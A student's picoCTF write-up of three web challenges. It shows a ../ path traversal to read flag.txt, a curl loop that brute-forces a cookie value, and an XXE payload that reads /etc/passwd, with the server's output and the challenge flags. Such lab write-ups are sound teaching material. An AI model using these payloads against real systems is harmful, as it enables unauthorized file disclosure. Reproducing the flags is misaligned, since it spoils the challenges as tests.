# Forbidden Paths

**Flag:**  `picoCTF{7h3_p47h_70_5ucc355_6db46514}`

How you approached the challenge:

  

- 3 pieces information are given in the question, first is the path of the flag , second is the path of the current directory and third is the fact that we cannot use absolute paths.  

- The search bar acts like the `cat` command, so if i put in something like `/flag.txt` in the search bar, it should give me the flag, but it won't because it is filtering out the absolute paths.
- So i need to go back to parent directories using `..` operator and then when i get inside `/` , i read `flag.txt`
```
../../../../flag.txt
```
Using this fetched me the flag.

What you learned through solving this challenge:

1. Using `..` operator to access any fi;e in any parent directory

# Cookies

  

**Flag:**  `picoCTF{3v3ry1_l0v3s_c00k135_96cdadfd}`


How you approached the challenge:
- First i noticed that on the website, i noticed that there is only one cookie by the name of `name` & value `-1` on `http://mercury.picoctf.net:54219/` , is i search for any value , say `hello world`, response comes from `http://mercury.picoctf.net:54219/search` which has an extra `session` cookie with some value.
![hello world search](https://github.com/loded-diper/cryptonite_tp_2/blob/main/Images/hello_world.png)

- When we search for `snickerdoodle`,  we are redirected to `http://mercury.picoctf.net:54219/check` with a text saying `I love snickerdoodle cookies!`, and this page has a cookie with name `name` and value `0`.
![snickerdoodle search](https://github.com/loded-diper/cryptonite_tp_2/blob/main/Images/snickerdoodle.png)

- If i try to change the value of the cookie manually to say `1`, then the page reloads and shows `I love chocolate chip cookies!`
```
document.cookie = "name=1; path=/";
```
![Cookie: name=1](https://github.com/loded-diper/cryptonite_tp_2/blob/main/Images/chocolate_chip.png)
When i change the value to 2, it shows `I love oatmeal raisin cookies!`.

- So i created a shell script using `CURL` which sends `GET` requests to `http://mercury.picoctf.net:54219/check` modifying the value of cookie each time & greps `picoCTF` if found.
```bash
vishad@VISHAD:~$ vim script.sh

#!/bin/bash
for i in {0..100}
do
    curl -s -X GET "http://mercury.picoctf.net:54219/check" -b "name=$i" | grep "picoCTF" && echo "Found at $i"
done
```
On running this script i got the flag at `i=18`
```bash
vishad@VISHAD:~$ bash script.sh
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_96cdadfd}</code></p>
Found at 18
```
I also manually checked it at the website by modifying the cookie there & got the flag.
```
document.cookie = "name=18; path=/";
``` 
![Cookie: name=18](https://github.com/loded-diper/cryptonite_tp_2/blob/main/Images/cookie_18.png)


What you learned through solving this challenge:

1. Modifying cookies using console

2. Using loops in scripts


Other incorrect methods you tried:

- Tried to search names & values of `name` and `session` cookie.

- Tried to search it in `.js` file
  

References
- https://www.geeksforgeeks.org/bash-scripting-for-loop/

- https://reqbin.com/req/c-bjcj04uw/curl-send-cookies-example

- etc.


# SOAP

**Flag:**  `picoCTF{XML_3xtern@l_3nt1t1ty_e5f02dbf}`

How you approached the challenge:

- In this challenge we needed to usle XXE injection to get the flag.
- In the website when we click details , the network showed communication with a site called `http://saturn.picoctf.net:56621/data` which could not be accessed using `GET` method.
- It had the following payload when clicked on details `<?xml version="1.0" encoding="UTF-8"?><data><ID>1</ID></data>`
-  so i needed to access the `etc/passwd` file , for which i sent the payload directly by editing it
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ELEMENT data ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>
  <ID>&xxe;</ID>
</data>
```
- using this i got the flag in return
```
Invalid ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
flask:x:999:999::/app:/bin/sh
picoctf:x:1001:picoCTF{XML_3xtern@l_3nt1t1ty_e5f02dbf}
```

What you learned through solving this challenge:
1. Use of XXE injections to access files on the server
  
Other incorrect methods you tried:
- Tried to change the ID of the original payload to random numbers like 0,-1 or big numbers